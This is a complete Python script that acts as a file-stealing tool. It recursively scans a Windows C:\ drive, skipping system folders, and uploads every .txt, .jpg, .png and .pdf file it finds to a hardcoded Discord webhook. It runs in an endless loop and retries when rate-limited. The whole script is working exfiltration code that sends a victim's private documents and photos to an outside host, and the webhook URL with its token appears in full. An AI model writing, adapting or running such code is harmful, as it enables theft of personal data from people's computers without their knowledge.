import os
import time
import requests
from pathlib import Path


MAX_REQUESTS_PER_SECOND = 1
MIN_TIME_BETWEEN_REQUESTS = 1 / MAX_REQUESTS_PER_SECOND
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1103377250541391932/rBJX_p_1lmkUoUcA_zmEbJ3qhHbXoocinOtwlAqPji0EgHYo2486vpU0OvjcTAz_T102"
BLACKLISTED_DIRECTORIES = ["C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\$Recycle.Bin"]
ALLOWED_FILE_TYPES = [".txt", ".jpg", ".png", ".pdf"]
ROOT_DIRECTORY = "C:\\"

def get_file_type(file_path):
    return os.path.splitext(file_path)[1]


def is_file_allowed(file_path):
    file_type = get_file_type(file_path)
    return file_type in ALLOWED_FILE_TYPES


def is_directory_allowed(directory_path):
    for blacklisted_directory in BLACKLISTED_DIRECTORIES:
        if str(directory_path).startswith(blacklisted_directory):
            return False
    return True


def send_discord_message(message):
    headers = {
        "Content-Type": "application/json"
    }
    data = {
        "content": message
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=data, headers=headers)
        if response.status_code == 204:
            return True
        elif response.status_code == 429:
            print(f"Rate limited by Discord API, waiting for {response.headers['Retry-After']} seconds...")
            time.sleep(int(response.headers['Retry-After']) + 1)
            return send_discord_message(message)
        else:
            print(f"Error sending Discord message: {response.status_code} - {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error sending Discord message: {e}")
        return False



def upload_files_in_directory(directory_path):
    for file_path in Path(directory_path).iterdir():
        if file_path.is_file() and is_file_allowed(file_path):
            message = f"New file found: {file_path}"
            if send_discord_message(message):
                with open(file_path, "rb") as file:
                    response = requests.post(DISCORD_WEBHOOK_URL, files={"file": file})
                    if response.status_code != 200:
                        print(f"Error uploading file {file_path}: {response.status_code} - {response.text}")
                    else:
                        time.sleep(MIN_TIME_BETWEEN_REQUESTS)
            else:
                print("Error sending Discord message")
        elif file_path.is_dir() and is_directory_allowed(file_path):
            upload_files_in_directory(file_path)
            time.sleep(MIN_TIME_BETWEEN_REQUESTS)




def main():
    while True:
        for directory_path in Path(ROOT_DIRECTORY).iterdir():
            if directory_path.is_dir() and is_directory_allowed(directory_path):
                upload_files_in_directory(directory_path)
            time.sleep(MIN_TIME_BETWEEN_REQUESTS)

if __name__ == "__main__":
    main()
